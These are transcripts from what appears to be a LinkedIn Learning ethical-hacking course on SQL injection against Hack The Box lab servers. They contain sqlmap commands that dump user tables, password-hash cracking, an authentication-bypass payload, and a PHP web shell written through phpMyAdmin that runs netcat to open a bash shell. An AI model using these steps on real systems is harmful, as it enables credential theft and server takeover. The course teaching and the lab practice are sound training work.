> **[0:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=5)** Let's take a look at how we approach the initial penetration of the Europa web server on the LinkedIn Learning Lab using SQL Map.
>
> **[0:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=13)** I've run an initial scan and we can see that it's ssh on port 22 on both http and https web services.
>
> **[0:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=22)** Port 80 presents the Apache default web page, as does port 443.
>
> **[0:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=30)** Let's look at our end map scan again.
>
> **[0:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=32)** We can see the SSL certificate uses the subject name europacorp.htb with alternative names of www.europacorp.htb and admin-portal.europacorp.htb.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=47)** Let's add admin-portal.europacorp.htb to our host file.
>
> **[0:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=56)** Sudo nano /etc/hosts.
>
> **[1:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=63)** And we'll put in 10.10.10.22 admin-portal.europacorp.htb
>
> **[1:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=82)** and we'll save that.
>
> **[1:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=84)** I'll start at BurpSuite and we'll turn off interception and in our target scope, we'll add admin-portal.europacorp.htb.
>
> **[1:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=107)** Okay, on our website, we'll select preferences, network settings, and manual proxy.
>
> **[2:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=125)** Okay, and we'll now go to admin-portal dot
>
> **[2:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=140)** https admin-portal.europacorp.htb.
>
> **[2:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=152)** We'll accept the risk and continue.
>
> **[2:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=156)** And we have a login page.
>
> **[2:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=158)** This is looking for an email address and a password.
>
> **[2:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=161)** Let's send in a request with a test email address and then check the message exchanges in BurpSuite.
>
> **[2:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=168)** Test at test dot nz.
>
> **[2:54](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=174)** And we'll use password.
>
> **[2:57](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=177)** Back in BurpSuite, we can see we've recorded our login post.
>
> **[3:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=185)** When we check it out, we see our credentials are at the bottom of the message.
>
> **[3:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=189)** We can use SQL Map to check the parameter string containing the credentials by using the dash dash data switch to provide the data portion of the post.
>
> **[3:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=199)** SQL Map minus u https admin-portal.europacorp.htb
>
> **[3:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=215)** minus minus data equals, and we'll put our data string in, email=test%40test.nz&password=password.
>
> **[4:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=244)** Okay, we'll let SQL Map run to its natural conclusion and then come back and look at the results.
>
> **[4:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=250)** SQL Map hasn't found anything at this stage, but let's make it try harder by forcing it to focus on the mySQL database.
>
> **[4:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=258)** We'll also give it the login PHP form directly.
>
> **[4:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=265)** So login php and minus minus dbms=mysql.
>
> **[4:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=275)** Okay, we'll let that run to its natural conclusion.
>
> **[4:39](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=279)** Okay, SQL Map is finished and we can now see that we've identified three ways to inject SQL.
>
> **[4:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=285)** Let's list out the databases.
>
> **[4:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=288)** Minus minus dbs.
>
> **[4:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=293)** And we can see the information schemer and admin databases.
>
> **[4:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=298)** Let's see what tables are in the admin database.
>
> **[5:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=303)** Minus D admin minus minus tables.
>
> **[5:15](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=315)** And we can see we have a users table and we'll dump out the contents.
>
> **[5:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=321)** Minus T users minus minus dump.
>
> **[5:28](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=328)** And we won't try and crack these.
>
> **[5:31](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=331)** And here we have our users and password hashes.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQL]] (9), data (4), web (3), [[MySQL]] (2), database (2)
> **Env Vars:** sql (9), ssl (1), php (1)
> **CLI Commands:** mysql (2), php (2), ssh (1), apache (1), sudo (1)
> **Ports:** port 22 (1), port 80 (1), port 443 (1)
> **Code Identifiers:** mysql (1)
> **Versions:** 10.10.10 (1)
> **UI Navigation:** go to (1)
> **Speakers:** - one (1)

#### Sanitizing input to SQL
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=0)** - [Instructor] Let's look at a more complex example where we have a general purpose execution function which handles both single and multiple SQL statements.
>
> **[0:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=9)** I've got one prepared.
>
> **[0:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=11)** There's sql2.py.
>
> **[0:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=16)** Here, we're allowing for multiple statements in an SQL query.
>
> **[0:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=20)** The function runsql, starting on line four, executes the query, and a cursor is returned.
>
> **[0:29](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=29)** It then iterates over the cursor, and for each iteration, fetches the result.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=34)** Then at line nine, for each result which has entries, it adds them to the results list.
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=41)** Let's run this.
>
> **[0:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=45)** Python3, sql2.py, and we'll enter 175.
>
> **[0:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=53)** And we get our result of Cleopatra II, again.
>
> **[0:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=58)** Now let's do a more extensive injection.
>
> **[1:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=63)** We'll terminate the query, and we'll use the MySQL database.
>
> **[1:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=73)** We'll select user and password from the user table, and then we'll revert back to our cleo database.
>
> **[1:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=90)** We've now suppressed the Pharaoh output, but we get the list of users in the MySQL database.
>
> **[1:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=98)** Again, we've taken advantage of having our input directly inserted into the SQL statement, and we've been able to code multiple statements in our injection.
>
> **[1:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=108)** Let's see how we can make this more complicated SQL routine safe.
>
> **[1:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=113)** It's not so simple to apply a prepared statement to a general purpose function covering multiple SQL statements.
>
> **[2:01](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=121)** Nano safesql2.py.
>
> **[2:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=128)** We can, however, simply validate our input.
>
> **[2:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=133)** In this case, at line 20, we just need to check for quotation characters.
>
> **[2:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=139)** We'll check for both single and double quotes with the code shown after the Pharaoh ID input.
>
> **[2:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=146)** Okay, let's run that.
>
> **[2:31](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=151)** Python3 safesql2.py.
>
> **[2:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=157)** And we'll enter 50, and we get Kamose again.
>
> **[2:42](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=162)** Now let's run our SQL injection attack.
>
> **[2:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=167)** ' or 1=1# to get all entries.
>
> **[2:54](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=174)** And this time it doesn't get through.
>
> **[2:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=176)** We catch the injection attempt, and don't run it.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQL]] (6), database (3), [[MySQL]] (2)
> **Env Vars:** sql (6)
> **CLI Commands:** python3 (2), mysql (2), make (1)
> **File Paths:** sql2.py (2), safesql2.py (2)
> **Speakers:** - [instructor] (1)

#### Inserting an SQL injection via Burp Suite
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inserting-an-sql-injection-via-burp-suite?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inserting-an-sql-injection-via-burp-suite?u=76281980&t=0)** - Before we leave Europa, let's go back to our burp suite capture and see what we can do with this. We'll right-click the post message and send it to the repeater.
>
> **[0:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inserting-an-sql-injection-via-burp-suite?u=76281980&t=12)** And we'll go to the repeater tab.
>
> **[0:14](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inserting-an-sql-injection-via-burp-suite?u=76281980&t=14)** We'll add our SQL injection into the email address, quote, and we'll use the plus for a space or plus one equals one.
>
> **[0:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inserting-an-sql-injection-via-burp-suite?u=76281980&t=26)** Plus we'll limit the output to one plus and we'll terminate.
>
> **[0:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inserting-an-sql-injection-via-burp-suite?u=76281980&t=35)** Plus we'll put a space and we'll send that and we get a redirect response.
>
> **[0:43](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inserting-an-sql-injection-via-burp-suite?u=76281980&t=43)** So we'll follow the redirection and then we'll show the response in the browser.
>
> **[0:54](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inserting-an-sql-injection-via-burp-suite?u=76281980&t=54)** To do that we'll copy and paste and go.
>
> **[1:01](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inserting-an-sql-injection-via-burp-suite?u=76281980&t=61)** And we running now as a logged-in admin.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Burp Suite]] (1), [[SQL]] (1)
> **UI Navigation:** right-click (1), go to (1)
> **Env Vars:** sql (1)
> **Cross-References:** go back to (1)
> **Speakers:** - before (1)

#### Following up with a second injection
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=0)** - Let's take a look at another SQL injection using SQL map using the rapid server on 10.10.10.71 We don't have this in the LinkedIn Lab.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=10)** So if you want to follow this yourself, you'll have to use the main hack the box system.
>
> **[0:14](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=14)** Before we start we'll load Burp Suite and proxy through it.
>
> **[0:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=20)** (mouse clicking) We'll turn off interception and we'll add 10.10.10.71 to our scope.
>
> **[0:40](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=40)** Okay.
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=41)** We'll set our browser to proxy by going to Preferences, Network Settings, manual proxy configuration.
>
> **[0:55](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=55)** Okay.
>
> **[0:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=56)** I've already done reconnaissance on this target and found it has a web portal on port 8080 and a folder named complain.
>
> **[1:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=64)** Let's connect to this 10.10.10.71 on port 8080
>
> **[1:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=73)** in the complain folder.
>
> **[1:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=76)** we're presented with what's called a Complain Management System.
>
> **[1:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=80)** And note it says complain or not complaint.
>
> **[1:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=85)** Let's register ourselves as a customer username user, password user 1, 2, 3, 4 customer.
>
> **[1:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=96)** And our address 1 Strangely Rd Our mobile number is 050006007765
>
> **[1:51](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=111)** and our address is a@b.c and were registered.
>
> **[1:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=118)** Okay, now we've registered let's login.
>
> **[2:01](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=121)** user with our password user 1, 2, 3, 4, and we're a customer.
>
> **[2:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=131)** We'll leave the website here for the moment while we check out the vulnerabilities on this system.
>
> **[2:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=137)** If we're on searchsploit using the keyword complain searchsploit complain.
>
> **[2:29](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=149)** We can see the first entry is a blind SQL injection.
>
> **[2:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=153)** Let's take a look at it and we'll copy /user/share/exploitdb/exploits/phb/webapps/
>
> **[2:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=173)** 42968.txt to complain.txt
>
> **[3:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=183)** And let's have a look at that. nano complaint.txt Okay.
>
> **[3:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=189)** We can see the exploit has details of the vulnerability and also an SQL map command.
>
> **[3:15](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=195)** So let's copy that, We can use the SQL map statement, but we'll need to use the RAB typee address and use our own session ID.
>
> **[3:31](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=211)** So we'll paste that and we'll go to Burp and check out the post message where we logged in.
>
> **[3:40](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=220)** That's our login.
>
> **[3:42](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=222)** We can see the message has the string PHP sesh ID.
>
> **[3:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=227)** Let's copy that
>
> **[3:55](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=235)** Copy that, Okay. We'll reconstruct the SQL map, command with that.
>
> **[4:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=245)** we'll paste that in here And we'll change the address to10.10.71:8080/complain.
>
> **[4:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=274)** We'll also add -dbs to get a list of databases.
>
> **[4:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=281)** - - dbs.
>
> **[4:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=288)** Okay.
>
> **[4:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=288)** We found a number of databases including one called secret.
>
> **[4:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=292)** Let's choose that and take a look at what tables it holds.
>
> **[4:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=296)** So we'll run that query again with -D secret and look for -- tables.
>
> **[5:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=310)** And we can see, we have a users table let's dump that
>
> **[5:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=316)** - T users -- dump.
>
> **[5:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=323)** And we get a set of users and hashes.
>
> **[5:27](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=327)** We can save this in a temporary file and we'll crack using a dictionary based attack.
>
> **[5:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=332)** And the file we'll use for the attack is /user/share/wordlists/rockyou.txt
>
> **[5:46](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=346)** And we're starting to crack the passwords.
>
> **[5:49](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=349)** And out of the 10 accounts, we find four passwords for the ones we didn't get.
>
> **[5:54](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=354)** We can try CrackStation.
>
> **[5:55](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=355)** Let's try Kain.
>
> **[6:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=364)** We'll paste that confirm we are a person and we'll crack the hash.
>
> **[6:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=372)** We find this empty 5 hash and the password is doradaybendita.
>
> **[6:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=377)** I won't run through the others, but if we did, we'd find that we failed to crack Zephon and Turel but we do find the rest. Okay.
>
> **[6:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=384)** We've run our SQL injection using SQL map and obtain credentials from the database and crack them.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQL]] (8), [[Databases]] (2), [[LinkedIn]] (1), [[Burp Suite]] (1), web (1)
> **Env Vars:** sql (8), rab (1), php (1)
> **File Paths:** b.c (1), 42968.txt (1), complain.txt (1), complaint.txt (1), user/share/wordlists/rockyou.txt (1)
> **CLI Commands:** find (4), php (1)
> **Versions:** 10.10.10 (3), 10.71 (1)
> **Ports:** port 8080 (2), :8080 (1)
> **Speakers:** - let (1), - t (1)
> **UI Navigation:** go to (1)

#### Defeating the WAF
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=0)** - [Instructor] Let's take a look at another of the Hack The Box lab servers, Jarvis.
>
> **[0:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=4)** And here we have a hotel site.
>
> **[0:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=6)** We can navigate around a bit, but there's no active way to do anything.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=10)** However, if we go to the Rooms or Dining & Bar pages, we can click on an entry, and we see we have a PHP file with a parameter.
>
> **[0:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=24)** If we add a quote to that, and enter, we get a very strange response from the website.
>
> **[0:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=33)** So maybe we should check this out with SQLMAP.
>
> **[0:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=37)** So, sqlmap http:// 10.10.10.
>
> **[0:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=45)** .143 /room .PHP /?
>
> **[0:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=52)** Cod =1.
>
> **[0:59](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=59)** We haven't found an injection, but we see that sqlmap recommends trying again with a random agent switch.
>
> **[1:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=66)** So let's try that with - random agent.
>
> **[1:14](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=74)** And we'll let the target use its own session ID.
>
> **[1:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=80)** Okay, now we're getting somewhere, and the site looks like it's vulnerable.
>
> **[1:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=84)** Let's check out its databases.
>
> **[1:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=86)** We'll run that again, with the switch, --dbs.
>
> **[1:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=92)** And we have hotel, information_schema, MySQL and performance_schema.
>
> **[1:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=97)** We're on familiar ground now.
>
> **[1:39](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=99)** So let's check out the MySQL table.
>
> **[1:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=104)** Database MySQL and --tables.
>
> **[1:55](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=115)** And as expected we have a user table, so let's
>
> **[2:01](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=121)** - T user, and let's dump it.
>
> **[2:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=130)** And we'll let MySQL try cracking the hashes and we'll give it user share word lists rock you dot text as its dictionary file.
>
> **[2:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=152)** And we get, I miss you as the password.
>
> **[2:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=157)** We have Db admin with a password of, I miss you.
>
> **[2:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=161)** I've already done some further enumeration of the target and I've found there's a phpMyAdmin page.
>
> **[2:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=168)** Let's go to that.
>
> **[2:49](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=169)** Okay. And let's use our credentials login with DB admin and the password of I miss you.
>
> **[3:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=186)** And we're in.
>
> **[3:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=187)** We can see that we have an SQL panel.
>
> **[3:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=191)** We can try select, user comma password from my SQL dot user and we press the go button and we can see we have DB admin and it's stash password.
>
> **[3:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=210)** So that worked after a bit of trial and error.
>
> **[3:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=213)** We found that we could write into the VAR www HTML folder.
>
> **[3:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=218)** We can now create a PHP shell.
>
> **[3:40](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=220)** We go back to our SQL page and type select PHP system and see minus LP 2, 2, 2, 2 minus E slash bin slash bash, close the PHP and put that into our file Slash bar slash www slash HTML slash Shelley dot PHP, Here we go, and that returned an empty result set,
>
> **[4:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=270)** but it worked so it can now run Shelly dot PHP and open up a listener and see ten.ten.ten.one 4 3 2 2 2 2, who am I I'm WW data.
>
> **[4:55](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=295)** And we've been able to get a show from our initial SQL injection.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[PHP]] (7), [[MySQL]] (4), [[SQL]] (4), [[HTML]] (2), [[Databases]] (1)
> **Env Vars:** php (7), sql (4), html (2), sqlmap (1), var (1)
> **CLI Commands:** php (7), mysql (4)
> **Code Identifiers:** information_schema (1), performance_schema (1), phpmyadmin (1)
> **UI Navigation:** go to (2), click on (1)
> **Speakers:** - [instructor] (1), - t (1)
> **Versions:** 10.10.10 (1)
> **Cross-References:** go back to (1)

#### Navigating a complex injection
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=0)** - [Instructor] I'm connected to the Hack the Box testing lab, and we'll do a scan of the server on 10.10.10.31.
>
